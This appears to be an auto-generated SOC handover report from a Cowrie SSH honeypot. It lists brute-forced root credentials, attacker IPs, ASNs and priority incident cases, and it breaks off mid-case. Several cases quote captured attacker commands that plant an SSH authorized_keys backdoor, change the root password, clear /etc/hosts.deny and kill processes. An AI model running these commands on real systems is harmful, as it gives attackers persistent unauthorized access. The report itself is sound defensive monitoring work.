# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-15 |
| **Generated At** | 2026-03-15T12:48:39Z |
| **Shift Time** | 12:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **395** |
| Confirmed Threats | **271** |
| False Positives Filtered | **124** (31.4%) |
| Unique Attacker IPs | **108** |
| Countries of Origin | **29** |
| High Severity Cases | **83** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **312** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **210** |
| Unique Credential Pairs | **150** |
| Unique Usernames | **90** |
| Unique Passwords | **112** |
| Successful Auth Pairs | **80** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 91 |
| `345gs5662d34` | 10 |
| `admin` | 5 |
| `shyam` | 4 |
| `pi` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 16 |
| `12345` | 11 |
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `password` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `123456` | 4 |
| `root` | `123456789` | 4 |
| `root` | `admin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789` | `167.71.132.83` | 2026-03-15T02:08:47 |
| `root` | `password` | `167.71.132.83` | 2026-03-15T02:09:35 |
| `root` | `admin` | `167.71.132.83` | 2026-03-15T02:10:54 |
| `root` | `12345` | `167.71.132.83` | 2026-03-15T02:11:56 |
| `root` | `1234` | `167.71.132.83` | 2026-03-15T02:13:09 |
| `root` | `Huawei@123#` | `118.194.230.250` | 2026-03-15T02:26:43 |
| `root` | `3245gs5662d34` | `118.194.230.250` | 2026-03-15T02:26:47 |
| `root` | `Devops123` | `118.194.230.250` | 2026-03-15T02:28:46 |
| `root` | `123456@Abc` | `101.52.130.122` | 2026-03-15T02:40:34 |
| `root` | `Aa@123123` | `105.27.148.94` | 2026-03-15T02:45:02 |
| `root` | `Aa@123123` | `189.152.42.213` | 2026-03-15T02:45:07 |
| `root` | `3245gs5662d34` | `105.27.148.94` | 2026-03-15T02:45:08 |
| `root` | `3245gs5662d34` | `189.152.42.213` | 2026-03-15T02:45:13 |
| `root` | `201314` | `179.183.192.58` | 2026-03-15T02:56:53 |
| `root` | `3245gs5662d34` | `179.183.192.58` | 2026-03-15T02:57:00 |
| `root` | `pippo123` | `118.193.36.245` | 2026-03-15T04:49:22 |
| `root` | `3245gs5662d34` | `118.193.36.245` | 2026-03-15T04:49:25 |
| `root` | `1qaz2wsx` | `206.189.138.45` | 2026-03-15T05:00:28 |
| `root` | `qwerty123456` | `206.189.138.45` | 2026-03-15T05:01:09 |
| `root` | `123456Q!` | `118.193.36.245` | 2026-03-15T05:01:27 |
| `root` | `!root` | `206.189.138.45` | 2026-03-15T05:01:48 |
| `root` | `root!@#` | `206.189.138.45` | 2026-03-15T05:02:28 |
| `root` | `P@ssw0rd2026` | `206.189.138.45` | 2026-03-15T05:03:06 |
| `root` | `Qwerty123456789` | `118.193.36.245` | 2026-03-15T05:03:28 |
| `root` | `Admin2026!` | `206.189.138.45` | 2026-03-15T05:03:44 |
| `root` | `root2026` | `206.189.138.45` | 2026-03-15T05:04:25 |
| `root` | `ZXCasd123` | `129.222.203.37` | 2026-03-15T05:07:37 |
| `root` | `3245gs5662d34` | `129.222.203.37` | 2026-03-15T05:07:45 |
| `root` | `1234567` | `172.210.53.192` | 2026-03-15T06:26:54 |
| `root` | `12345678` | `172.210.53.192` | 2026-03-15T06:41:08 |
| `root` | `123456789` | `172.210.53.192` | 2026-03-15T06:55:30 |
| `root` | `admin` | `46.101.119.234` | 2026-03-15T06:58:31 |
| `root` | `password` | `46.101.119.234` | 2026-03-15T06:59:18 |
| `root` | `toor` | `46.101.119.234` | 2026-03-15T07:00:52 |
| `root` | `qwerty` | `46.101.119.234` | 2026-03-15T07:01:40 |
| `root` | `12345` | `46.101.119.234` | 2026-03-15T07:02:32 |
| `root` | `root@123` | `172.210.53.192` | 2026-03-15T07:39:13 |
| `root` | `admin` | `161.35.170.148` | 2026-03-15T07:48:29 |
| `root` | `password` | `161.35.170.148` | 2026-03-15T07:49:32 |
| `root` | `123456789` | `161.35.170.148` | 2026-03-15T07:51:34 |
| `root` | `root@1234` | `172.210.53.192` | 2026-03-15T08:08:40 |
| `root` | `admin` | `172.210.53.192` | 2026-03-15T08:23:26 |
| `root` | `root123` | `165.22.214.235` | 2026-03-15T08:36:04 |
| `root` | `root321` | `165.22.214.235` | 2026-03-15T08:36:56 |
| `root` | `administrator` | `172.210.53.192` | 2026-03-15T08:53:03 |
| `root` | `Administrator` | `172.210.53.192` | 2026-03-15T09:07:53 |
| `root` | `Admin` | `172.210.53.192` | 2026-03-15T09:22:47 |
| `root` | `Hello123!` | `118.194.250.47` | 2026-03-15T09:26:54 |
| `root` | `3245gs5662d34` | `118.194.250.47` | 2026-03-15T09:26:57 |
| `root` | `admin1234` | `172.210.53.192` | 2026-03-15T09:37:46 |
| `root` | `Admin@123` | `103.95.13.221` | 2026-03-15T09:46:49 |
| `root` | `admin12345` | `172.210.53.192` | 2026-03-15T09:52:46 |
| `root` | `1` | `143.244.140.97` | 2026-03-15T09:56:54 |
| `root` | `12` | `143.244.140.97` | 2026-03-15T09:57:39 |
| `root` | `123` | `143.244.140.97` | 2026-03-15T09:58:23 |
| `root` | `1234` | `143.244.140.97` | 2026-03-15T09:59:07 |
| `root` | `12345` | `143.244.140.97` | 2026-03-15T09:59:51 |
| `root` | `Admin12345` | `172.210.53.192` | 2026-03-15T10:23:04 |
| `root` | `xmhdipc` | `112.81.45.208` | 2026-03-15T10:32:56 |
| `root` | `1234567890` | `167.99.95.73` | 2026-03-15T10:48:23 |
| `root` | `password1` | `167.99.95.73` | 2026-03-15T10:49:12 |
| `root` | `admin123` | `167.99.95.73` | 2026-03-15T10:50:00 |
| `root` | `1234` | `167.99.95.73` | 2026-03-15T10:51:08 |
| `root` | `123` | `167.99.95.73` | 2026-03-15T10:52:07 |
| `root` | `Admin@123` | `172.210.53.192` | 2026-03-15T10:53:30 |
| `root` | `administrator123` | `172.210.53.192` | 2026-03-15T11:08:42 |
| `root` | `Pass@123` | `104.248.59.8` | 2026-03-15T11:55:38 |
| `root` | `admin1234` | `104.248.59.8` | 2026-03-15T11:56:23 |
| `root` | `admin123` | `104.248.59.8` | 2026-03-15T11:56:44 |
| `root` | `ubuntu` | `104.248.59.8` | 2026-03-15T11:56:59 |
| `root` | `P@ssword` | `104.248.59.8` | 2026-03-15T11:57:20 |
| `root` | `123456789` | `104.248.59.8` | 2026-03-15T11:57:27 |
| `root` | `root@2026` | `104.248.59.8` | 2026-03-15T11:58:17 |
| `root` | `1qaz2wsx` | `143.110.244.207` | 2026-03-15T12:29:21 |
| `root` | `qwerty123456` | `143.110.244.207` | 2026-03-15T12:30:04 |
| `root` | `!root` | `143.110.244.207` | 2026-03-15T12:30:51 |
| `root` | `root!@#` | `143.110.244.207` | 2026-03-15T12:31:34 |
| `root` | `P@ssw0rd2026` | `143.110.244.207` | 2026-03-15T12:32:16 |
| `root` | `Admin2026!` | `143.110.244.207` | 2026-03-15T12:33:02 |
| `root` | `root2026` | `143.110.244.207` | 2026-03-15T12:33:49 |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **108** |
| Unique ASNs | **51** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 14 | HIGH |
| `AS8075` | Microsoft Corporation | 14 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 6 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (59)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-858976dd2d2a

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:26 |
| **Last Seen** | 2026-03-15 02:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:26:43` | `cowrie.session.connect` |
| `2026-03-15 02:26:43` | `cowrie.client.version` |
| `2026-03-15 02:26:43` | `cowrie.client.kex` |
| `2026-03-15 02:26:43` | `cowrie.login.success` |
| `2026-03-15 02:26:44` | `cowrie.session.params` |
| `2026-03-15 02:26:44` | `cowrie.command.input` |
| `2026-03-15 02:26:44` | `cowrie.command.failed` |
| `2026-03-15 02:26:44` | `cowrie.log.closed` |
| `2026-03-15 02:26:44` | `cowrie.session.params` |
| `2026-03-15 02:26:44` | `cowrie.command.input` |
| `2026-03-15 02:26:44` | `cowrie.session.file_download` |
| `2026-03-15 02:26:44` | `cowrie.log.closed` |
| `2026-03-15 02:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf808a5a9b23

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:26 |
| **Last Seen** | 2026-03-15 02:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:26:46` | `cowrie.session.connect` |
| `2026-03-15 02:26:46` | `cowrie.client.version` |
| `2026-03-15 02:26:46` | `cowrie.client.kex` |
| `2026-03-15 02:26:47` | `cowrie.login.success` |
| `2026-03-15 02:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e9d04e04f0

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:28 |
| **Last Seen** | 2026-03-15 02:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:28:45` | `cowrie.session.connect` |
| `2026-03-15 02:28:45` | `cowrie.client.version` |
| `2026-03-15 02:28:45` | `cowrie.client.kex` |
| `2026-03-15 02:28:46` | `cowrie.login.success` |
| `2026-03-15 02:28:46` | `cowrie.session.params` |
| `2026-03-15 02:28:46` | `cowrie.command.input` |
| `2026-03-15 02:28:46` | `cowrie.command.failed` |
| `2026-03-15 02:28:46` | `cowrie.log.closed` |
| `2026-03-15 02:28:47` | `cowrie.session.params` |
| `2026-03-15 02:28:47` | `cowrie.command.input` |
| `2026-03-15 02:28:47` | `cowrie.session.file_download` |
| `2026-03-15 02:28:47` | `cowrie.log.closed` |
| `2026-03-15 02:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe673381b5d0

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:28 |
| **Last Seen** | 2026-03-15 02:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:28:49` | `cowrie.session.connect` |
| `2026-03-15 02:28:49` | `cowrie.client.version` |
| `2026-03-15 02:28:49` | `cowrie.client.kex` |
| `2026-03-15 02:28:49` | `cowrie.login.success` |
| `2026-03-15 02:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70620d6aa19e

| Field | Detail |
|---|---|
| **Source IP** | `101.52.130[.]122` |
| **First Seen** | 2026-03-15 02:40 |
| **Last Seen** | 2026-03-15 02:41 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:EaQA55UOXe9f"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:40:30` | `cowrie.session.connect` |
| `2026-03-15 02:40:30` | `cowrie.client.version` |
| `2026-03-15 02:40:31` | `cowrie.client.kex` |
| `2026-03-15 02:40:34` | `cowrie.login.success` |
| `2026-03-15 02:40:35` | `cowrie.session.params` |
| `2026-03-15 02:40:35` | `cowrie.command.input` |
| `2026-03-15 02:40:35` | `cowrie.command.failed` |
| `2026-03-15 02:40:36` | `cowrie.log.closed` |
| `2026-03-15 02:40:37` | `cowrie.session.params` |
| `2026-03-15 02:40:37` | `cowrie.command.input` |
| `2026-03-15 02:40:38` | `cowrie.session.file_download` |
| `2026-03-15 02:40:38` | `cowrie.log.closed` |
| `2026-03-15 02:40:53` | `cowrie.session.params` |
| `2026-03-15 02:40:53` | `cowrie.command.input` |
| `2026-03-15 02:40:53` | `cowrie.log.closed` |
| `2026-03-15 02:40:53` | `cowrie.session.params` |
| `2026-03-15 02:40:53` | `cowrie.command.input` |
| `2026-03-15 02:40:53` | `cowrie.log.closed` |
| `2026-03-15 02:40:54` | `cowrie.session.params` |
| `2026-03-15 02:40:54` | `cowrie.command.input` |
| `2026-03-15 02:40:54` | `cowrie.session.file_download` |
| `2026-03-15 02:40:54` | `cowrie.log.closed` |
| `2026-03-15 02:40:54` | `cowrie.session.params` |
| `2026-03-15 02:40:54` | `cowrie.command.input` |
| `2026-03-15 02:40:54` | `cowrie.log.closed` |
| `2026-03-15 02:40:55` | `cowrie.session.params` |
| `2026-03-15 02:40:55` | `cowrie.command.input` |
| `2026-03-15 02:40:55` | `cowrie.log.closed` |
| `2026-03-15 02:40:55` | `cowrie.session.params` |
| `2026-03-15 02:40:55` | `cowrie.command.input` |
| `2026-03-15 02:40:55` | `cowrie.command.input` |
| `2026-03-15 02:40:55` | `cowrie.log.closed` |
| `2026-03-15 02:40:56` | `cowrie.session.params` |
| `2026-03-15 02:40:56` | `cowrie.command.input` |
| `2026-03-15 02:40:56` | `cowrie.log.closed` |
| `2026-03-15 02:40:56` | `cowrie.session.params` |
| `2026-03-15 02:40:56` | `cowrie.command.input` |
| `2026-03-15 02:40:56` | `cowrie.log.closed` |
| `2026-03-15 02:40:56` | `cowrie.session.params` |
| `2026-03-15 02:40:56` | `cowrie.command.input` |
| `2026-03-15 02:40:57` | `cowrie.log.closed` |
| `2026-03-15 02:40:57` | `cowrie.session.params` |
| `2026-03-15 02:40:57` | `cowrie.command.input` |
| `2026-03-15 02:40:57` | `cowrie.log.closed` |
| `2026-03-15 02:40:57` | `cowrie.session.params` |
| `2026-03-15 02:40:57` | `cowrie.command.input` |
| `2026-03-15 02:40:57` | `cowrie.log.closed` |
| `2026-03-15 02:40:58` | `cowrie.session.params` |
| `2026-03-15 02:40:58` | `cowrie.command.input` |
| `2026-03-15 02:40:58` | `cowrie.log.closed` |
| `2026-03-15 02:40:58` | `cowrie.session.params` |
| `2026-03-15 02:40:58` | `cowrie.command.input` |
| `2026-03-15 02:40:58` | `cowrie.log.closed` |
| `2026-03-15 02:40:59` | `cowrie.session.params` |
| `2026-03-15 02:40:59` | `cowrie.command.input` |
| `2026-03-15 02:40:59` | `cowrie.log.closed` |
| `2026-03-15 02:40:59` | `cowrie.session.params` |
| `2026-03-15 02:40:59` | `cowrie.command.input` |
| `2026-03-15 02:40:59` | `cowrie.log.closed` |
| `2026-03-15 02:41:00` | `cowrie.session.params` |
| `2026-03-15 02:41:00` | `cowrie.command.input` |
| `2026-03-15 02:41:00` | `cowrie.log.closed` |
| `2026-03-15 02:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.52.130[.]122` to AbuseIPDB if not already reported
- [ ] Block `101.52.130[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feac3c4d6c28

| Field | Detail |
|---|---|
| **Source IP** | `105.27.148[.]94` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:01` | `cowrie.session.connect` |
| `2026-03-15 02:45:01` | `cowrie.client.version` |
| `2026-03-15 02:45:01` | `cowrie.client.kex` |
| `2026-03-15 02:45:02` | `cowrie.login.success` |
| `2026-03-15 02:45:02` | `cowrie.session.params` |
| `2026-03-15 02:45:02` | `cowrie.command.input` |
| `2026-03-15 02:45:02` | `cowrie.command.failed` |
| `2026-03-15 02:45:03` | `cowrie.log.closed` |
| `2026-03-15 02:45:03` | `cowrie.session.params` |
| `2026-03-15 02:45:03` | `cowrie.command.input` |
| `2026-03-15 02:45:03` | `cowrie.session.file_download` |
| `2026-03-15 02:45:03` | `cowrie.log.closed` |
| `2026-03-15 02:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `105.27.148[.]94` to AbuseIPDB if not already reported
- [ ] Block `105.27.148[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccd389769a8f

| Field | Detail |
|---|---|
| **Source IP** | `189.152.42[.]213` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:06` | `cowrie.session.connect` |
| `2026-03-15 02:45:06` | `cowrie.client.version` |
| `2026-03-15 02:45:06` | `cowrie.client.kex` |
| `2026-03-15 02:45:07` | `cowrie.login.success` |
| `2026-03-15 02:45:08` | `cowrie.session.params` |
| `2026-03-15 02:45:08` | `cowrie.command.input` |
| `2026-03-15 02:45:08` | `cowrie.command.failed` |
| `2026-03-15 02:45:08` | `cowrie.log.closed` |
| `2026-03-15 02:45:09` | `cowrie.session.params` |
| `2026-03-15 02:45:09` | `cowrie.command.input` |
| `2026-03-15 02:45:09` | `cowrie.session.file_download` |
| `2026-03-15 02:45:09` | `cowrie.log.closed` |
| `2026-03-15 02:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.152.42[.]213` to AbuseIPDB if not already reported
- [ ] Block `189.152.42[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3292e382368a

| Field | Detail |
|---|---|
| **Source IP** | `105.27.148[.]94` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:06` | `cowrie.session.connect` |
| `2026-03-15 02:45:06` | `cowrie.client.version` |
| `2026-03-15 02:45:07` | `cowrie.client.kex` |
| `2026-03-15 02:45:08` | `cowrie.login.success` |
| `2026-03-15 02:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `105.27.148[.]94` to AbuseIPDB if not already reported
- [ ] Block `105.27.148[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684f13727ed9

| Field | Detail |
|---|---|
| **Source IP** | `189.152.42[.]213` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:12` | `cowrie.session.connect` |
| `2026-03-15 02:45:12` | `cowrie.client.version` |
| `2026-03-15 02:45:12` | `cowrie.client.kex` |
| `2026-03-15 02:45:13` | `cowrie.login.success` |
| `2026-03-15 02:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.152.42[.]213` to AbuseIPDB if not already reported
- [ ] Block `189.152.42[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c29d4d2b7e7

| Field | Detail |
|---|---|
| **Source IP** | `179.183.192[.]58` |
| **First Seen** | 2026-03-15 02:56 |
| **Last Seen** | 2026-03-15 02:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
